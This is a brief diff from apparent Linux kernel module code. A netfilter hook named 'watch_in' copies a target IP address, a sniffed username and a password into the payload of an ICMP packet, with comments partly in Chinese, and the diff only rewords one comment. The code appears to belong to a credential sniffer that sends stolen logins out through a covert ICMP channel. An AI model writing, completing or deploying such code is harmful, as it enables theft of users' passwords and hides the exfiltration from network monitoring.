@@ -224,7 +224,7 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
 	}
    };
  
-   /* Now copy the 自身的IP address, then Username, then password into packet */
+   /* Now copy the target_IP , then Username, then password into packet */
    /*(char *)icmp 是为了保证指针移动的标准是char* ，64位OS中是8字节*/
    cp_data = (char *)((char *)icmp + sizeof(struct icmphdr)); 
    memcpy(cp_data, &target_ip, 4);
